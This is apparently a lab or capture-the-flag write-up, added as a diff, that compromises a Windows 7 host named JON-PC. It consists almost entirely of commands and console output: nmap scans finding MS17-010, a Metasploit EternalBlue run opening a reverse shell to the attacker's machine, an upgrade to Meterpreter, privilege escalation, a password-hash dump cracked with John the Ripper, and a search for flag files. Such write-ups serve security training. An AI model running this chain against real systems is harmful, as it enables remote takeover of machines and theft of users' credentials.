@@ -1,0 +1,264 @@
+RECON
+nmap -sV 10.10.231.116
+
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  tcpwrapped
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC
+49159/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+ENUMERATION
+nmap --script smb-vuln-* 10.10.147.212
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+3389/tcp  open  ms-wbt-server
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49158/tcp open  unknown
+49159/tcp open  unknown
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+
+EXPLOIT
+msfconsole
+                                                  
+
+                                   .,,.                  .
+                                .\$$$$$L..,,==aaccaacc%#s$b.       d8,    d8P
+                     d8P        #$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p
+                  d888888P      '7$$$$\""""''^^`` .7$$$|D*"'```         ?88'
+  d8bd8b.d8p d8888b ?88' d888b8b            _.os#$|8*"`   d8P       ?8b  88P
+  88P`?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"`       d8P d8888b $whi?88b 88b
+ d88  d8 ?8 88b     88b 88b  ,88b .osS$$$$*" ?88,.d88b, d88 d8P' ?88 88P `?8b
+d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"`    `?88'  ?88 ?88 88b  d88 d88
+                          .a#$$$$$$"`          88b  d8P  88b`?8888P'
+                       ,s$$$$$$$"`             888888P'   88n      _.,,,ass;:
+                    .a$$$$$$$P`               d88P'    .,.ass%#S$$$$$$$$$$$$$$'
+                 .a$###$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'
+              ,a$$###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'
+           .a$$$$$$$$$$SSS$$$$$$$$$$$$$$$$$$$$$$$$$$$$SS##==--""''^^/$$$$$$'
+_______________________________________________________________   ,&$$$$$$'_____
+                                                                 ll&&$$$$'
+                                                              .;;lll&&&&'
+                                                            ...;;lllll&'
+                                                          ......;;;llll;;;....
+                                                           ` ......;;;;... .  .
+
+
+       =[ metasploit v4.17.3-dev                          ]
++ -- --=[ 1795 exploits - 1019 auxiliary - 310 post       ]
++ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf > use exploit/windows/smb/ms17_010_eternalblue
+msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.147.212
+RHOST => 10.10.147.212
+msf exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 10.11.10.169:4444 
+[*] 10.10.147.212:445 - Connecting to target for exploitation.
+[+] 10.10.147.212:445 - Connection established for exploitation.
+[+] 10.10.147.212:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 10.10.147.212:445 - CORE raw buffer dump (42 bytes)
+[*] 10.10.147.212:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 10.10.147.212:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
+[*] 10.10.147.212:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
+[+] 10.10.147.212:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 10.10.147.212:445 - Trying exploit with 12 Groom Allocations.
+[*] 10.10.147.212:445 - Sending all but last fragment of exploit packet
+[*] 10.10.147.212:445 - Starting non-paged pool grooming
+[+] 10.10.147.212:445 - Sending SMBv2 buffers
+[+] 10.10.147.212:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 10.10.147.212:445 - Sending final SMBv2 buffers.
+[*] 10.10.147.212:445 - Sending last fragment of exploit packet!
+[*] 10.10.147.212:445 - Receiving response from exploit packet
+[+] 10.10.147.212:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 10.10.147.212:445 - Sending egg to corrupted connection.
+[*] 10.10.147.212:445 - Triggering free of corrupted buffer.
+[*] Command shell session 1 opened (10.11.10.169:4444 -> 10.10.147.212:49172) at 2020-10-16 16:11:48 -0400
+[+] 10.10.147.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.147.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 10.10.147.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>^Z
+Background session 1? [y/N]  y
+msf exploit(windows/smb/ms17_010_eternalblue) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                                                       Connection
+  --  ----  ----               -----------                                                                       ----------
+  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.11.10.169:4444 -> 10.10.147.212:49172 (10.10.147.212)
+
+msf exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
+msf post(multi/manage/shell_to_meterpreter) > show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on.
+
+msf post(multi/manage/shell_to_meterpreter) > set session 1
+session => 1
+msf post(multi/manage/shell_to_meterpreter) > run
+
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.11.10.169:4433 
+#<Thread:0x06cb4110@/usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:93 run> terminated with exception (report_on_exception is true):
+Traceback (most recent call last):
+	1: from /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
+/usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:268:in `block in cleanup_handler': uninitialized constant Msf::Modules::Mod706f73742f6d756c74692f6d616e6167652f7368656c6c5f746f5f6d65746572707265746572::MetasploitModule::HANDLE_TIMEOUT (NameError)
+[*] Post module execution completed
+msf post(multi/manage/shell_to_meterpreter) > 
+[*] Sending stage (179779 bytes) to 10.10.147.212
+[*] Meterpreter session 2 opened (10.11.10.169:4433 -> 10.10.147.212:49187) at 2020-10-16 16:19:47 -0400
+
+msf post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                                                       Connection
+  --  ----  ----                     -----------                                                                       ----------
+  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.11.10.169:4444 -> 10.10.147.212:49172 (10.10.147.212)
+  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.11.10.169:4433 -> 10.10.147.212:49187 (10.10.147.212)
+
+msf post(multi/manage/shell_to_meterpreter) > set session 2
+session => 2
+msf post(multi/manage/shell_to_meterpreter) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.11.10.169:4433 
+[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: The system cannot find the file specified.
+[-] Call stack:
+[-]   /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:163:in `execute'
+[-]   /usr/share/metasploit-framework/lib/msf/core/post/common.rb:89:in `cmd_exec'
+[-]   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:164:in `run'
+[*] Post module execution completed
+msf post(multi/manage/shell_to_meterpreter) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                                                       Connection
+  --  ----  ----                     -----------                                                                       ----------
+  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.11.10.169:4444 -> 10.10.147.212:49172 (10.10.147.212)
+  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.11.10.169:4433 -> 10.10.147.212:49187 (10.10.147.212)
+
+msf post(multi/manage/shell_to_meterpreter) > show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION  2                yes       The session to run this module on.
+
+msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > shell
+Process 2904 created.
+Channel 3 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>^Z
+Background channel 3? [y/N]  y
+
+meterpreter > run post/windows/gather/hashdump 
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+Jon:"Nah boi, I ain't sharing nutting with you"
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+
+meterpreter >
+
+POST EXPLOITATION
+root@kali:~/# john hashes --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
+                 (Administrator)
+alqfna22         (Jon)
+
+FLAGS
+
+
+C:\>dir flag* /s /p
+dir flag* /s /p
+ Volume in drive C has no label.
+ Volume Serial Number is E611-0B66
+
+ Directory of C:\
+
+03/17/2019  02:27 PM                24 flag1.txt
+               1 File(s)             24 bytes
+
+ Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent
+
+03/17/2019  02:26 PM               482 flag1.lnk
+03/17/2019  02:30 PM               848 flag2.lnk
+03/17/2019  02:32 PM             2,344 flag3.lnk
+               3 File(s)          3,674 bytes
+
+ Directory of C:\Users\Jon\Documents
+
+03/17/2019  02:26 PM                37 flag3.txt
+               1 File(s)             37 bytes
+
+     Total Files Listed:
+               5 File(s)          3,735 bytes
+               0 Dir(s)  22,796,713,984 bytes free
